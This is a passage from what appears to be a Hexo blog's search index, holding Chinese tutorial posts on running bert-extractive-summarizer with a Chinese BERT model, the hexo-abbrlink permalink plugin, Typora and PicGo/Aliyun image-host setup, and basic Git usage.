href="#搭建-bert-extractive-summarizer-环境" class="headerlink" title="搭建 bert-extractive-summarizer 环境"></a>搭建 bert-extractive-summarizer 环境</h2><p>首先从github上clone该项目</p><p>然后运行一个小demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;This repo is the generalization of the lecture-summarizer repo. This tool utilizes the HuggingFace Pytorch transformers library to run extractive summarizations. This works by first embedding the sentences, then running a clustering algorithm, finding the sentences that are closest to the cluster&#x27;s centroids. This library also uses coreference techniques, utilizing the https://github.com/huggingface/neuralcoref library to resolve words in summaries that need more context. The greedyness of the neuralcoref library can be tweaked in the CoreferenceHandler class.As of the most recent version of bert-extractive-summarizer, by default, CUDA is used if a gpu is available.&quot;</span></span><br><span class="line">model = Summarizer()</span><br><span class="line">result = model(body, num_sentences=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>下载好相应的依赖后发现出现报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218101532243.png" alt="image-20231218101532243"></p><p>这里的报错原因在于：代码试图从Hugging Face模型存储库（<a href="https://huggingface.co)下载模型文件,但由于网站不稳定等原因无法连接到该服务器./">https://huggingface.co）下载模型文件，但由于网站不稳定等原因无法连接到该服务器。</a></p><blockquote><p>在使用Hugging Face Transformers库时（很多需要用到某些模型的机器学习库都是这样），如果你指定的模型没有在本地缓存中找到，库会尝试从Hugging Face模型存储库下载所需的模型文件，以便进行后续的模型初始化和使用。这是因为模型文件通常比较大，不方便直接包含在库中，因此在需要时会动态下载。</p></blockquote><p>因此这里我们选择手动下载模型</p><h2 id="手动下载中文模型"><a href="#手动下载中文模型" class="headerlink" title="手动下载中文模型"></a>手动下载中文模型</h2><p>Hugging Face Transformers库所使用的默认bert模型 bert-large-uncased 只可以用于英文语料，如果我们要将该项目应用在中文的摘要任务上需要稍作修改，使用一个中文的bert模型和一个中文的分词器。</p><p>首先我们<strong>手动下载中文的bert模型 bert-base-chinese</strong> </p><p>打开Hugging Face的官网搜索我们想要的模型<a href="https://huggingface.co/bert-base-chinese">bert-base-chinese</a>，点击files，下载下面红框内的四个文件，然后根据你使用的框架选择相应的模型文件，如果使用的是pytorch就下载pytorch_model.bin，如果是TensorFlow就换成tf_model.h5，这里我们使用的是pytorch，所以选择pytorch_model.bin进行下载。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218103610166.png" alt="image-20231218103610166"></p><p>将下载好的文件放在我们的项目目录下，比如我这里建立了一个bert-base-chinese文件夹存放：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218104219354.png" alt="image-20231218104219354"></p><p>接下来将需要用到该模型的地方修改为我们本地的路径就可以了</p><h1 id="修改源代码"><a href="#修改源代码" class="headerlink" title="修改源代码"></a>修改源代码</h1><p>spacy默认使用英文分词，我们需要将其改成中文。</p><p>将 <code>bert-extractive-summarizer/summarizer/sentence_handler.py</code> 下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.en <span class="keyword">import</span> English </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=English</span>):</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.zh <span class="keyword">import</span> Chinese</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=Chinese</span>):</span><br></pre></td></tr></table></figure><h1 id="测试模型"><a href="#测试模型" class="headerlink" title="测试模型"></a>测试模型</h1><p>在主目录下创建test.py测试模型，在这里我们使用的是自己手动下载的模型，使用<code>AutoConfig</code>、<code>AutoTokenizer</code>和<code>AutoModel</code>来加载bert-base-chinese&#x2F;目录下的模型和相关配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load model, model config and tokenizer via Transformers</span></span><br><span class="line">custom_config = AutoConfig.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_config.output_hidden_states=<span class="literal">True</span></span><br><span class="line">custom_tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_model = AutoModel.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>, config=custom_config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">body = <span class="string">&#x27;准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。灰色西装外套配上细框眼镜，高雄市副市长史哲，出席海事展剪彩活动，作为高雄近年艺文展演重要推手的他，如今传出可能接任文化部长，立委(民)赵天麟说：「史哲副市长有非常丰富的行政经历，在陈菊市长时代就被称为点子王，在陈其迈市长的时代里面，他更是把亚洲新湾区，变成了是一个国际非常知名的亮点，我相信可以把，这么成功的高雄经验南方经验，成为未来的台湾之光。」盘点史哲过去艺文经历，不但曾担任过高雄的新闻处长，文化局长等等，也曾操刀陈水扁的竞选广告，2009年世运会开幕典礼，筹画设计的三太子骑机车，一举让台湾跃上国际舞台，另外催生驳二和高雄总图，以及推出高雄春天艺术节，重办大港开唱等等，也都出自史哲之手，源源不绝的创意经验，堪称超级点子王。立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」虽然史哲并没证实即将入阁，不过原文化部长李永得，已经要转任政委，而目前文化部仍有公视法修法，和中正纪念堂转型两大关键政策，预计要在今年推动，究竟最终，是不是由史哲继续接手，未来文化部长的执行力，将成为检验内阁改组的重要指标。新闻来源：华视新闻&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = Summarizer(custom_model=custom_model, custom_tokenizer=custom_tokenizer)</span><br><span class="line"><span class="built_in">print</span>(model(body, num_sentences=<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。 被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。 立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://blog.csdn.net/du_lun/article/details/129462104">https://blog.csdn.net/du_lun/article/details/129462104</a></li><li><a href="https://blog.csdn.net/m0_46295727/article/details/133221439">https://blog.csdn.net/m0_46295727/article/details/133221439</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『SEO优化』：Hexo-abbrlink插件生成hexo永久固定链接</title>
      <link href="/posts/1e78.html"/>
      <url>/posts/1e78.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo默认url格式存在的问题"><a href="#hexo默认url格式存在的问题" class="headerlink" title="hexo默认url格式存在的问题"></a>hexo默认url格式存在的问题</h1><p>Hexo在生成博客文章链接时，默认的静态URL格式是 <code>:year/:month/:day/:title</code>，也就是按照年、月、日、标题格式来生成固定链接的，如<code>http://xxx.yy.com/2020/07/06/hello-world</code>。</p><p><strong>这样的话就会存在一些问题：</strong></p><ul><li><p>如果你的标题是中文的话，你的URL链接就会包含中文，例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204194948770.png" alt="image-20231204194948770"></p><p>这样的url路径复制后会将中文变成一大堆字符串编码：<a href="https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/">https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/</a> </p><p>如果你在其它地方用了你自己这篇文章的url链接，偶然你又修改了该文章的标题，那<strong>这个url链接就会失效</strong>。</p></li><li><p>这样的url格式中年月日都会有分隔符，生成的链接会成为一个四级目录，<strong>对于搜索引擎来说并不是很友好。</strong></p><blockquote><p>百度蜘蛛在抓取网页时遵循以下规则：</p><p>网页的抓取频率与其权重和信用度成正比，尤其是对网站的首页和内页。通常，蜘蛛首先抓取网站的首页，因为首页通常具有更高的权重，而且大多数链接都指向首页。然后，通过首页抓取网站的内页，但并非所有内页都会被蜘蛛抓取。</p><p>搜索引擎认为对于一般的中小型站点，3层结构足以包含所有内容，因此蜘蛛主要抓取前三层的内容。超过三层的内容被认为相对不重要，因此蜘蛛不会经常爬取这些内容。因此，在设计链接结构时，最好将permalink后面的层级控制在2个斜杠以内。</p></blockquote></li></ul><h1 id="hexo-abbrlink的安装配置"><a href="#hexo-abbrlink的安装配置" class="headerlink" title="hexo-abbrlink的安装配置"></a><strong>hexo-abbrlink的安装配置</strong></h1><p>为了解决上面提到的问题，我们使用Hexo的插件<strong>hexo-abbrlink</strong>，它能将 Hexo 生成的永久链接转化为一个固定的随机值，极大的缩短了永久链接的长度。一旦生成一个随机值，之后对文章的标题或者时间进行任何修改，这个随机的 abbrlink 是不会发生任何变化的，也为 Hexo 的维护提供了便利。</p><p>博客目录下执行命令安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$npm install hexo-abbrlink --save </span><br></pre></td></tr></table></figure><p>修改<code>_config.yml</code>文件中的配置项（记得把原来的<code>permalink:</code>删除掉）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置永久链接</span><br><span class="line">permalink: posts/:abbrlink.html  </span><br><span class="line">abbrlink:</span><br><span class="line">    alg: crc16   #算法： crc16(default) and crc32</span><br><span class="line">    rep: dec     #进制： dec(default) and hex</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><blockquote><p>参考文章<a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></p><p>在生成之前就要改好算法和形式。不然后面再改的话会导致链接不统一。我就踩过坑，但后来是一个文章一个文章删除<code>abbrlink:</code>的值才改过来的，还好我文章不是很多。</p><p>话说最近看到了Hexo-abbrlink2这个插件，可以从1.html开始编。</p><p>我试用了一下，会导致文章重复，正在研究如何解决。如果能从1开始编写的话，这样更容易看得出写了多少篇文章，当前上传和修改的是哪一篇。后面再研究。</p><p>PS：刚使用这个插件后，阅读人数和评论都会变为0，介意慎用！综上所述，这插件适合新站！</p></blockquote><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>侵权删：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/112318081">https://zhuanlan.zhihu.com/p/112318081</a></li><li><a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></li><li><a href="https://cloud.tencent.com/developer/article/1936315">https://cloud.tencent.com/developer/article/1936315</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『typora』相关配置与体验优化</title>
      <link href="/posts/c91a.html"/>
      <url>/posts/c91a.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍typora配置过程中的一些<strong>问题的解决方法</strong>以及<strong>优化体验方案</strong>。</p><h1 id="版本过期报错"><a href="#版本过期报错" class="headerlink" title="版本过期报错"></a>版本过期报错</h1><p>下载完成后如果出现版本过期的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204191844101.png" alt="image-20231204191844101"></p><p>具体解决方法参考：<a href="https://blog.csdn.net/wagnteng/article/details/126585618">https://blog.csdn.net/wagnteng/article/details/126585618</a></p><h1 id="设置右键菜单新建md"><a href="#设置右键菜单新建md" class="headerlink" title="设置右键菜单新建md"></a>设置右键菜单新建md</h1><p>任意位置创建一个txt文件，后缀改为reg</p><p>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md]</span><br><span class="line">@=&quot;Typora.md&quot;</span><br><span class="line">&quot;Content Type&quot;=&quot;text/markdown&quot;</span><br><span class="line">&quot;PerceivedType&quot;=&quot;text&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>完成后运行，运行完成后可以删除掉该文件</p><h1 id="图床配置：阿里云-PicGo-Core-command-line"><a href="#图床配置：阿里云-PicGo-Core-command-line" class="headerlink" title="图床配置：阿里云 + PicGo Core (command line)"></a>图床配置：阿里云 + PicGo Core (command line)</h1><p>Typora是一个跨平台的markdown编辑器，使用markdown编辑器写文章优点是排版简洁，痛点则是无法像Word那样直接嵌入图片，插入的图片实际上插入的是图片的路径（可以是本地路径也可以是网络路径），默认情况下为本地路径，这种情况下的md文档在别的终端上打开会无法查看图片。</p><p><strong>我们可以自己配置图床构建网络路径，来实现md文档的跨平台跨设备浏览</strong></p><p>下面介绍这里采用阿里云 + PicGo Core (command line)的方法来对图床进行配置的方法：</p><p><strong>1. PicGo Core (command line)下载与配置</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716132921821.png" alt="image-20230716132921821"></p><p>下载完成后打开找到文件夹 <code>C:\Users\用户名\AppData\Roaming\Typora\picgo\win64\</code> ，在对应文件夹下cmd执行 <code>./.config/Typora/picgo/linux/picgo install gitee-uploader</code>，若执行失败需要去安装nodejs环境</p><blockquote><p>nodejs安装教程：<a href="https://blog.csdn.net/zimeng303/article/details/112167688">https://blog.csdn.net/zimeng303/article/details/112167688</a></p></blockquote><p>完成后打开配置文件</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/348e3092fc111d18984bd35b197a3357.png" alt="image-20200620214326041"></p><p>文件内容修改如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;isodatop&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储空间名</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oss-cn-beijing&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储区域代号</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义存储路径</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://isodatop.oss-cn-beijing.aliyuncs.com&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义域名，注意要加 http://或者 https://</span></span><br><span class="line">      <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> <span class="comment">// 针对图片的一些后缀处理参数 PicGo 2.2.0+ PicGo-Core 1.4.0+</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>accesskeyid与secret的获取：</strong></p><p>登录阿里云，进入控制台，可以在里面查看这两个字段</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170158751.png" alt="image-20230716170158751"></p></li><li><p><strong>bucket、area、customUrl的获取</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170626283.png" alt="image-20230716170626283"></p><p>再点击进入bucket，bucket名称即为isodatop</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170714631.png" alt="image-20230716170714631"></p><p>点击概览</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170833593.png" alt="image-20230716170833593"></p><p>这里的②为<code>oss-cn-beijing.aliyuncs.com</code>，注意要去掉后面的<code>.aliyuncs.com</code>，将<code>oss-cn-beijing</code>填入area字段</p><p>③为<code>isodatop.oss-cn-beijing.aliyuncs.com</code>，添加上<code>https://</code>后填入 customUrl 字段</p><p><strong>2. 测试</strong></p><p>配置完成后打开typora的偏好设置，验证上传服务是否配置成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171455885.png" alt="image-20230716171455885"></p><p>出现如下界面则上传成功：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171616617.png" alt="image-20230716171616617"></p><blockquote><p><strong>如果出现报错或者上传成功但是图片在typora里面不予显示的情况</strong>：</p><p>注意检查前面几个字段是否按照要求进行了删除与添加相应的字段</p></blockquote></li></ul><h1 id="优化体验设置"><a href="#优化体验设置" class="headerlink" title="优化体验设置"></a>优化体验设置</h1><ul><li>文本高亮：<a href="https://blog.csdn.net/weixin_40626630/article/details/111405928">https://blog.csdn.net/weixin_40626630/article/details/111405928</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Git』Git使用教程</title>
      <link href="/posts/b860.html"/>
      <url>/posts/b860.html</url>
      
        <content type="html"><![CDATA[<h1 id="克隆GitHub仓库到本地"><a href="#克隆GitHub仓库到本地" class="headerlink" title="克隆GitHub仓库到本地"></a>克隆GitHub仓库到本地</h1><p>方法一：Code -&gt; Download ZIP（有的时候会有一些问题，不建议）</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215133946737.png" alt="image-20231215133946737"></p><p><strong>方法二：使用git clone项目到本地（推荐）</strong></p><p>Code -&gt; 复制HTTPS协议对应的url。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215134218730.png" alt="image-20231215134218730"></p><p>在本地文件夹打开Git Bash，在命令行中输入以下命令，将仓库克隆到本地（这里的仓库地址就是上面复制的url）：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">clone</span> <span class="title">仓库地址</span></span><br></pre></td></tr></table></figure><p>执行命令后，Git就会从GitHub服务器上将仓库的所有文件和历史记录克隆到你的本地目录中。克隆完成后，你可以在当前目录下找到一个与仓库同名的文件夹，里面包含了完整的仓库内容。</p><p>后续可以安装相关依赖等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt --user</span><br></pre></td></tr></table></figure><h1 id="本地代码和GitHub同步"><a href="#本地代码和GitHub同步" class="headerlink" title="本地代码和GitHub同步"></a>本地代码和GitHub同步</h1><h2 id="将github项目pull到本地"><a href="#将github项目pull到本地" class="headerlink" title="将github项目pull到本地"></a>将github项目pull到本地</h2><p><strong>第一次pull：</strong></p><p>即将远程代码仓库中(新)的内容下载到本地，并更新本地代码仓库的内容，我们一般叫pull。</p><p>首先需要在本地创建一个空文件夹，作为项目的存放仓库。然后进入该文件夹下，打开Git Bush，输入以下命令将该目录初始化为Git仓库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure><p>（之后该处会生成一个隐藏的文件夹【.git】）</p><p>然后将这个本地仓库连接到Github上的对应项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin 远程仓库地址</span><br></pre></td></tr></table></figure><p>这里的远程仓库地址就是前面所复制的HTTPS协议对应的url</p><blockquote><p>如果不小心填错了，可以使用指令清除地址重新设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote remove origin </span><br></pre></td></tr></table></figure><p>同样也可以执行命令查看是否连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br></pre></td></tr></table></figure></blockquote><p>然后，使用Pull指令拉取代码，从远程源的主分支更新代码到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p><strong>后续拉取github上的更新到本地：只需要git pull即可</strong></p><h2 id="将本地项目push到github"><a href="#将本地项目push到github" class="headerlink" title="将本地项目push到github"></a>将本地项目push到github</h2><p>第一次push：</p><p>同样的，创建空文件夹后git init</p><p>执行add命令<strong>将整个文件夹添加到本地仓库</strong>，注意后面有一个点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><blockquote><p>如果只想添加单个文件使用命令：<code> git add 文件名</code> 这种方式 ，例如：git add test.txt.</p></blockquote><p><strong>后续将本地更新后的代码上传到GitHub只需要</strong></p><p>如果在多个远程设备上操作，记得开始进行今日的操作前要先：</p><p>git pull</p><p>完成所有操作准备离开时要记得：</p><p>git add .<br>git commit -m ‘xx’<br>git push</p><p>tip: 要保证本地库和server是同步的，不然忘记先pull，若其他远程设备上已经push了新的内容，自己这里是push不上去的，只能进行git pull合并，这个操作还会覆盖你已经更改了的部分，会非常痛苦qwq。</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><ul><li><strong>error: src refspec master does not match any</strong>：<ul><li>解决：<a href="https://blog.csdn.net/qq_38198952/article/details/82792279">https://blog.csdn.net/qq_38198952/article/details/82792279</a></li></ul></li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>侵权删：</p><ul><li><a href="https://devpress.csdn.net/cloud-native/64ffdfd8993dd34278ee2d52.html">https://devpress.csdn.net/cloud-native/64ffdfd8993dd34278ee2d52.html</a></li><li><a href="https://blog.csdn.net/daydayup858/article/details/128201627">https://blog.csdn.net/daydayup858/article/details/128201627</a></li><li><a href="https://zhuanlan.zhihu.com/p/438410278">https://zhuanlan.zhihu.com/p/438410278</a></li><li><a href="https://blog.csdn.net/qq_45583787/article/details/126882580">https://blog.csdn.net/qq_45583787/article/details/126882580</a></li><li><a href="https://blog.csdn.net/vir_lee/article/details/80464408">https://blog.csdn.net/vir_lee/article/details/80464408</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 版本控制 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
